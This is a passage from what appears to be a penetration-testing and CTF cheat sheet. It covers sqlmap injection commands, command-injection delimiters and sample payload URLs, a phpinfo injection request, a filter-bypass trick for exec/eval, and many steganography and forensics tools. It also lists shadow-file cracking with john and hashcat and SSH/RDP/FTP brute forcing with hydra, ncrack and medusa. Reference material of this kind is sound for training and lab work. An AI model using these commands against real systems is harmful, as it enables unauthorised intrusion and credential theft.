sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner --dbs

# Bypass

sqlmap -u 'http://10.10.10.143/room.php?cod=1' --user-agent "<your_user_agent>"



- Resources:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/#gref
```


## Command Injection
```
## Find a input filed whose interacting with operating system shell

## Try to execute and system shell commands with delimiter

# Possible Related Parameters

- daemon
- host
- file
- upload
- dir
- execute
- download
- log
- ip
- cli
- cmd

# Delimiter List

- ;
- ^
- &
- &&
- |
- ||
- %0D
- %0A
- \n
- <

# Example

http://example.com/sample.php?file=1;ls
http://example.com/sample.php?file=value;pwd
http://example.com/sample.php?file=value1;dir

# Tool

https://github.com/commixproject/commix
```


## XXE
```
# Use Burpsuite with correct payloads for testing parameters
```

## PHPinfo Injection
```
# If you have the path "phpinfo.php" you can try this injection

	POST /phpinfo.php HTTP/1.1
	Host: 10.10.10.84
	...
	...
	...
	Content-Type: multipart/form-data; boundary=--InjectionPHP

	----InjectionPHP
	Content-Disposition: form-data; name="anything"; filename="Injection"
	Content-Type: text/plain

	Injection PHP PoC

	----InjectionPHP


# And look the variable "anything" with the value "Injection" in "http://10.10.10.84/phpinfo.php"

# If you also have a LFI vulnerability, you should be check the section "File Inclusion" in this guide
```


# **Cryptography**

## Identify Cipher
```
# Online Tools:

https://www.boxentriq.com/code-breaking/cipher-identifier


# Kali Tools:

hash-identifier (https://tools.kali.org/password-attacks/hash-identifier)
```

## Ciphers


### AES
```
- AES has a static block size of 128 bits and key sizes of 128, 192 or 256 bits.

- AES is a algorithm of symmetric cryptography.

- This algorithm need 2 components for decipher:

	. A key
	
	. An IV (Initialitation Vector)
```

# **Stego**

## Tools

### steghide
```
# Steghide is a steganography program that hides data in various kinds of image and audio files.

# Only supports these file formats:

JPEG, BMP, WAV and AU

steghide info <file> (displays info about a file whether it has embedded data or not)
steghide extract -sf <file> (extracts embedded data from a file)
```


### stegpy
```
# Stegpy is a program for encoding information in image and audio files through steganography.

# Only supports these file formats:

PNG, BMP, GIF, WebP, WAV (Images in a different format are automatically converted to PNG. Different audio formats are not supported at all)

stegpy <file>
```


### bpstegano
```
# BPStegano is a steganography tool with characteristics like AES-128 encryption of input data, random Least Significant Bit (LSB) pixel encoding and supports plain text (raw string) data hiding

# Only supports these file formats:

pdf, exe, jpg, png, txt, gif, etc.

python stegano.py (run the main panel)
```

### foremost
```
# Foremost is a program that recovers files based on their headers , footers and internal data structures.

# Supports these file formats:

jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp

foremost -i <file> (extracts data from the given file)
```



### stegsolve
```
# Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images.
```

### strings
```
# Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings

# Supports these file formats:

All

strings <file>  (displays printable strings in the given file)
```



### exiftool
```
# Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files.

# Supports these file formats:

Many

exiftool <file>  (shows the metadata of the given file)
```



### exiv2
```
# A tool similar to exiftool.

# Supports these file formats:

Many

exiv2 <file>  (shows the metadata of the given file)
```



### binwalk
```
# Binwalk is a tool for searching binary files like images and audio files for embedded files and data.

# Supports these file formats:

Many

binwalk <file>  (Displays the embedded data in the given file)
binwalk -e <file>  (Displays and extracts the data from the given file)
```



### zsteg
```
# zsteg is a tool that can detect hidden data in png and bmp files.

# Supports these file formats:

png, bmp

zsteg -a <file> (Runs all the methods on the given file)
zsteg -E <file> (Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png)
```



### wavsteg
```
# WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files.

# Supports these file formats:

wav

python3 WavSteg.py -r -s <soundfile.wav> -o <outputfile>  (extracts data from a wav sound file and outputs the data into a new file)
```



### sonic visualizer
```
# Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files.

# Supports these file formats:

Many

sonic-visualiser <file>
```



### hexeditor
```
# Hexadecimal editor. 

# Supports these file formats:

All

hexeditor <file>
```


### turgen system
```
# Versatile utility that allows you to create your own tapes with software for Atari 8-bit computers.

# Supports these file formats:

WAV

java -jar turgen.jar

(https://sourceforge.net/projects/turgen/)
```



## Techniques


### GIF by frames
```
# With GIF file, try see your frames

https://ezgif.com/split
```


### Scan entropy
```
# Try to see entropy of a file (binwalk)
```


### BAR & QR code 
```
# When you found a BAR code image or QR code try with this tool for decode it.

https://www.onlinebarcodereader.com/
```


### DNA code
```
# When you found some like this:

ATG CGTA CATG CGGA ... ... ...
ATGCATGGCATGATCAT...

# This is the Genetic Code:

adenina (A), timina (T), guanina (G) y citosina (C) in the DNA (ADN in spanish)

# You can try decode it with some decoder.

https://www.onlineocr.net/

http://2013.igem.org/wiki/images/d/d9/BGU_Kids_Activities_Full_Kit_-_new.pdf

https://www.oercommons.org/courseware/lesson/17460/overview
```


### Magic Numbers
```
# Magic Numbers are used to identify, with the first BYTES, what type of extension a file has.

https://asecuritysite.com/forensics/magic
```


### Decode WAV file with TurgenSystem
```
# Using TurgenSystem decode WAV files

Tools --> TurboDecoder --> Attach decoder --> Jump --> Decode until EOF

strings <results>
strings *

Reference: see "retro" stego challenge (htb)
```

### Binary Data to Image PNG
```
# Convert Binary Data to Image PNG

https://www.dcode.fr/binary-image

Reference: see "digital cube" stego challenge (htb)
```

## Brute Force in Image, ZIP, Audio


### Stegcracker
```
# A tool that bruteforces passwords using steghide.

stegcracker <file> [<wordlist>]

https://github.com/Paradoxis/StegCracker
```



### fcrackzip
```
# Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives.

fcrackzip -u -D -p wordlist.txt file.zip
```



## Online Decoders


### Unicode Text Steganography
```
# A web tool for unicode steganography , it can encode and decode text.

https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder
```


### npiet
```
# An online interpreter for piet. piet is an esoteric language , programs in piet are images.

https://www.bertnase.de/npiet/npiet-execute.php
```



### dcode.fr
```
# Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful.

https://www.dcode.fr/
```


### Cyber Chef
```
# Many decoders and encoders.


https://gchq.github.io/CyberChef/
```


### Cipher Identifier
```
# Detect ciphers.

https://www.boxentriq.com/code-breaking/cipher-identifier
```



# **Forensic**


## Tools Forensics


### Volatility

```
# The Volatility Framework is a completely open collection of tools, for the
extraction of digital artifacts from volatile memory (RAM) samples.

https://github.com/volatilityfoundation/volatility
```



# **Python**

## Web Scraping
```
...
```

## Functions Vulnerable
```
# Exec() & Eval()

  If you see "exec" function is probably that it can be exploited.

# If we have blocked the characters for execute commands:

  & ; - ` || |

  We can use "$" for this purpose:

  $(command)
```

# **Brute Force ALL**
```bash
# John the Ripper shadow file

$ unshadow passwd shadow > unshadow.db
$ john unshadow.db


# Hashcat SHA512 $6$ shadow file
hashcat -m 1800 -a 0 hash.txt rockyou.txt --username


#Hashcat MD5 $1$ shadow file
hashcat -m 500 -a 0 hash.txt rockyou.txt --username


# Hashcat MD5 Apache webdav file
hashcat -m 1600 -a 0 hash.txt rockyou.txt


# Hashcat SHA1
hashcat -m 100 -a 0 hash.txt rockyou.txt --force


# Hashcat Wordpress
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt


# RDP user with password list
ncrack -vv --user offsec -P passwords rdp://target


# SSH user with password list
hydra -l user -P pass.txt -t 10 target ssh -s 22


# FTP user with password list
medusa -h target -u user -P passwords.txt -M ftp
```




